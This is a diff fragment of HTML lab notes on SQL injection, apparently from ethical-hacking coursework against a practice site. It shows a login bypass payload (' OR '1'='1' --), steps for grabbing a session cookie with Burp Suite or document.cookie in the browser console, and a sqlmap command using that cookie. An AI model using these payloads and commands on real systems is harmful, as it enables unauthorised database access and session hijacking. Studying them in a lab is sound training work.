@@ -539,6 +539,7 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
         <ul>Start Burp Suite</ul>
         <ul>use the Burp Suite browser to log in at www.moviescope.com using a username and password bla' OR '1'='1' --</ul>
         <ul>after login use Burp Suite to copy a cookie</ul>
+        <ul>the cookie can also be captured without Burp Suite, by using Firefox Inspect element > Console > document.cookie</ul>
         <ul>start sqlmap</ul>
         <ul>sqlmap http://www.moviescope.com/viewprofile.aspx?id=1 --cookie "mscope=xxxxx=; ui-tabs-1=0"</ul>
         <ul>as soon as you found out the right dbase name and table name:</ul>
